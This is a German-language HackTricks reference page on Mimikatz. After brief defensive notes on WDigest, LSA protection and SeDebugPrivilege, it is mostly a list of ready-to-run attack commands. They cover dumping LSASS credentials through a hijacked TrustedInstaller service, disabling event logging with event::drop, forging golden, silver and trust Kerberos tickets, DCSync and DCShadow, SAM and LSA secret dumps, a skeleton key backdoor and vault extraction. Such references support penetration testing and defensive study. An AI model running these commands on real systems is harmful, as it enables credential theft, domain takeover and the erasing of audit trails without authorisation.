# Mimikatz

{{#include ../../banners/hacktricks-training.md}}

**Diese Seite basiert auf einer von [adsecurity.org](https://adsecurity.org/?page_id=1821)**. Überprüfen Sie das Original für weitere Informationen!

## LM und Klartext im Speicher

Seit Windows 8.1 und Windows Server 2012 R2 wurden erhebliche Maßnahmen ergriffen, um gegen den Diebstahl von Anmeldeinformationen zu schützen:

- **LM-Hashes und Klartext-Passwörter** werden nicht mehr im Speicher gespeichert, um die Sicherheit zu erhöhen. Eine spezifische Registrierungseinstellung, _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_, muss mit einem DWORD-Wert von `0` konfiguriert werden, um die Digest-Authentifizierung zu deaktivieren und sicherzustellen, dass "Klartext"-Passwörter nicht in LSASS zwischengespeichert werden.

- **LSA-Schutz** wird eingeführt, um den Local Security Authority (LSA)-Prozess vor unbefugtem Lesen des Speichers und Code-Injektionen zu schützen. Dies wird erreicht, indem LSASS als geschützter Prozess markiert wird. Die Aktivierung des LSA-Schutzes umfasst:
1. Ändern der Registrierung unter _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_ durch Setzen von `RunAsPPL` auf `dword:00000001`.
2. Implementierung eines Gruppenrichtlinienobjekts (GPO), das diese Registrierungänderung auf verwalteten Geräten durchsetzt.

Trotz dieser Schutzmaßnahmen können Tools wie Mimikatz den LSA-Schutz mit spezifischen Treibern umgehen, obwohl solche Aktionen wahrscheinlich in den Ereignisprotokollen aufgezeichnet werden.

### Gegenmaßnahmen zur Entfernung von SeDebugPrivilege

Administratoren haben typischerweise SeDebugPrivilege, das es ihnen ermöglicht, Programme zu debuggen. Dieses Privileg kann eingeschränkt werden, um unbefugte Speicherauszüge zu verhindern, eine gängige Technik, die von Angreifern verwendet wird, um Anmeldeinformationen aus dem Speicher zu extrahieren. Selbst wenn dieses Privileg entfernt wird, kann das TrustedInstaller-Konto jedoch weiterhin Speicherauszüge mit einer angepassten Dienstkonfiguration durchführen:
```bash
sc config TrustedInstaller binPath= "C:\\Users\\Public\\procdump64.exe -accepteula -ma lsass.exe C:\\Users\\Public\\lsass.dmp"
sc start TrustedInstaller
```
Dies ermöglicht das Dumpen des `lsass.exe`-Speichers in eine Datei, die dann auf einem anderen System analysiert werden kann, um Anmeldeinformationen zu extrahieren:
```
# privilege::debug
# sekurlsa::minidump lsass.dmp
# sekurlsa::logonpasswords
```
## Mimikatz Optionen

Das Manipulieren von Ereignisprotokollen in Mimikatz umfasst zwei Hauptaktionen: das Löschen von Ereignisprotokollen und das Patchen des Ereignisdienstes, um das Protokollieren neuer Ereignisse zu verhindern. Nachfolgend sind die Befehle für die Durchführung dieser Aktionen aufgeführt:

#### Löschen von Ereignisprotokollen

- **Befehl**: Diese Aktion zielt darauf ab, die Ereignisprotokolle zu löschen, um es schwieriger zu machen, böswillige Aktivitäten nachzuverfolgen.
- Mimikatz bietet in seiner Standarddokumentation keinen direkten Befehl zum Löschen von Ereignisprotokollen über die Befehlszeile. Das Manipulieren von Ereignisprotokollen umfasst jedoch typischerweise die Verwendung von Systemtools oder Skripten außerhalb von Mimikatz, um spezifische Protokolle zu löschen (z. B. mit PowerShell oder dem Windows-Ereignisanzeige).

#### Experimentelles Feature: Patchen des Ereignisdienstes

- **Befehl**: `event::drop`
- Dieser experimentelle Befehl ist darauf ausgelegt, das Verhalten des Ereignisprotokollierungsdienstes zu ändern, wodurch effektiv verhindert wird, dass neue Ereignisse aufgezeichnet werden.
- Beispiel: `mimikatz "privilege::debug" "event::drop" exit`

- Der Befehl `privilege::debug` stellt sicher, dass Mimikatz mit den erforderlichen Berechtigungen arbeitet, um Systemdienste zu ändern.
- Der Befehl `event::drop` patcht dann den Ereignisprotokollierungsdienst.

### Kerberos Ticket Angriffe

### Golden Ticket Erstellung

Ein Golden Ticket ermöglicht die impersonation mit domänenweiter Zugriffsberechtigung. Wichtiger Befehl und Parameter:

- Befehl: `kerberos::golden`
- Parameter:
- `/domain`: Der Domänenname.
- `/sid`: Der Sicherheitsbezeichner (SID) der Domäne.
- `/user`: Der Benutzername, der impersoniert werden soll.
- `/krbtgt`: Der NTLM-Hash des KDC-Dienstkontos der Domäne.
- `/ptt`: Injektiert das Ticket direkt in den Speicher.
- `/ticket`: Speichert das Ticket zur späteren Verwendung.

Beispiel:
```bash
mimikatz "kerberos::golden /user:admin /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /krbtgt:ntlmhash /ptt" exit
```
### Silver Ticket Erstellung

Silver Tickets gewähren Zugriff auf spezifische Dienste. Wichtiger Befehl und Parameter:

- Befehl: Ähnlich wie Golden Ticket, zielt aber auf spezifische Dienste ab.
- Parameter:
- `/service`: Der Dienst, der angegriffen werden soll (z.B. cifs, http).
- Andere Parameter ähnlich wie bei Golden Ticket.

Beispiel:
```bash
mimikatz "kerberos::golden /user:user /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /target:service.example.com /service:cifs /rc4:ntlmhash /ptt" exit
```
### Trust Ticket Erstellung

Trust Tickets werden verwendet, um auf Ressourcen über Domänen hinweg zuzugreifen, indem Vertrauensverhältnisse genutzt werden. Wichtiger Befehl und Parameter:

- Befehl: Ähnlich wie Golden Ticket, aber für Vertrauensverhältnisse.
- Parameter:
- `/target`: Der FQDN der Ziel-Domäne.
- `/rc4`: Der NTLM-Hash für das Vertrauenskonto.

Beispiel:
```bash
mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123456789-123456789 /sids:S-1-5-21-987654321-987654321-987654321-519 /rc4:ntlmhash /user:admin /service:krbtgt /target:parent.example.com /ptt" exit
```
### Zusätzliche Kerberos-Befehle

- **Tickets auflisten**:

- Befehl: `kerberos::list`
- Listet alle Kerberos-Tickets für die aktuelle Benutzersitzung auf.

- **Cache übergeben**:

- Befehl: `kerberos::ptc`
- Injektiert Kerberos-Tickets aus Cache-Dateien.
- Beispiel: `mimikatz "kerberos::ptc /ticket:ticket.kirbi" exit`

- **Ticket übergeben**:

- Befehl: `kerberos::ptt`
- Ermöglicht die Verwendung eines Kerberos-Tickets in einer anderen Sitzung.
- Beispiel: `mimikatz "kerberos::ptt /ticket:ticket.kirbi" exit`

- **Tickets löschen**:
- Befehl: `kerberos::purge`
- Löscht alle Kerberos-Tickets aus der Sitzung.
- Nützlich vor der Verwendung von Ticketmanipulationsbefehlen, um Konflikte zu vermeiden.

### Active Directory Manipulation

- **DCShadow**: Temporär einen Computer als DC für die Manipulation von AD-Objekten agieren lassen.

- `mimikatz "lsadump::dcshadow /object:targetObject /attribute:attributeName /value:newValue" exit`

- **DCSync**: Einen DC nachahmen, um Passwortdaten anzufordern.
- `mimikatz "lsadump::dcsync /user:targetUser /domain:targetDomain" exit`

### Zugriff auf Anmeldeinformationen

- **LSADUMP::LSA**: Anmeldeinformationen aus LSA extrahieren.

- `mimikatz "lsadump::lsa /inject" exit`

- **LSADUMP::NetSync**: Einen DC mit den Passwortdaten eines Computer-Kontos nachahmen.

- _Kein spezifischer Befehl für NetSync im ursprünglichen Kontext angegeben._

- **LSADUMP::SAM**: Zugriff auf die lokale SAM-Datenbank.

- `mimikatz "lsadump::sam" exit`

- **LSADUMP::Secrets**: Geheimnisse entschlüsseln, die in der Registrierung gespeichert sind.

- `mimikatz "lsadump::secrets" exit`

- **LSADUMP::SetNTLM**: Einen neuen NTLM-Hash für einen Benutzer festlegen.

- `mimikatz "lsadump::setntlm /user:targetUser /ntlm:newNtlmHash" exit`

- **LSADUMP::Trust**: Informationen zur Vertrauensauthentifizierung abrufen.
- `mimikatz "lsadump::trust" exit`

### Sonstiges

- **MISC::Skeleton**: Eine Hintertür in LSASS auf einem DC injizieren.
- `mimikatz "privilege::debug" "misc::skeleton" exit`

### Privilegieneskalation

- **PRIVILEGE::Backup**: Backup-Rechte erwerben.

- `mimikatz "privilege::backup" exit`

- **PRIVILEGE::Debug**: Debug-Rechte erhalten.
- `mimikatz "privilege::debug" exit`

### Anmeldeinformationen dumpen

- **SEKURLSA::LogonPasswords**: Anmeldeinformationen für angemeldete Benutzer anzeigen.

- `mimikatz "sekurlsa::logonpasswords" exit`

- **SEKURLSA::Tickets**: Kerberos-Tickets aus dem Speicher extrahieren.
- `mimikatz "sekurlsa::tickets /export" exit`

### SID- und Token-Manipulation

- **SID::add/modify**: SID und SIDHistory ändern.

- Hinzufügen: `mimikatz "sid::add /user:targetUser /sid:newSid" exit`
- Ändern: _Kein spezifischer Befehl für die Änderung im ursprünglichen Kontext angegeben._

- **TOKEN::Elevate**: Tokens nachahmen.
- `mimikatz "token::elevate /domainadmin" exit`

### Terminaldienste

- **TS::MultiRDP**: Mehrere RDP-Sitzungen zulassen.

- `mimikatz "ts::multirdp" exit`

- **TS::Sessions**: TS/RDP-Sitzungen auflisten.
- _Kein spezifischer Befehl für TS::Sessions im ursprünglichen Kontext angegeben._

### Vault

- Passwörter aus dem Windows Vault extrahieren.
- `mimikatz "vault::cred /patch" exit`


{{#include ../../banners/hacktricks-training.md}}
